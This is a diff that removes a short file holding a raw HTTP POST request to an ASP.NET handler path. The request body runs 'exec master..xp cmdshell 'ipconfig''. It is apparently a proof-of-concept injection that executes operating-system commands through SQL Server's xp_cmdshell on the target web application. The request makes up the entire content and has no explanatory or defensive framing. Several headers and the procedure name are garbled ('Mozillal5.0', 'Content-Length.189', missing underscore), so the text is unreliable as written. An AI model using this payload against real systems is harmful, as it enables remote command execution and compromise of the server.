@@ -1,9 +1,0 @@
-
-POST /c6/Contro/GetSglData.aspx/.ashx
-Host: ip.port
-User-Agent: Mozillal5.0 (Windows NT 5.1) AppleWebkit/537.36(KHTML， like Gecko) Chrome/35.0.2117.157 Safari/537 36
-Connection: close
-Content-Length.189
-Content-Type. text/plain
-Accept-Encoding: gzip
-exec master..xp cmdshell 'ipconfig'
